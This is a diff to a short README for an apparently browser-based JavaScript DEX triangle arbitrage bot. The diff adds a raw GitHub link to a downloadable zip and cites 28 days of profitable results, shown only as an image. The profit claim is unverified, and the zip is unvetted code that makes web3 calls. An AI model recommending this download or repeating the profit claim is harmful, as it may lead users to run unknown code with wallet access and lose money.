@@ -1,10 +1,8 @@
 This is a DEX "decentralized exchange" triangle arbitrage bot that's written in simple JavaScript and is ran in your web browser.
 This is very straightforward easy to read and easy to modify if you wish to do so. It makes all calls with web3. I made a short YouTube video a tutorial on how to configure and run it here
 
-
-
-You can download the zip file here
-
+You can download the bot zip file here
+https://github.com/Fantasticfanaticcoder/triangle-arbitrage-bot/raw/main/javascript-triangle-arbitrage.zip
 
 Here's my results after 28 days of running it 24/7 in my web browser.
 <img src="https://i.ibb.co/Dt5RJ9B/results.png" alt="results" border="0">
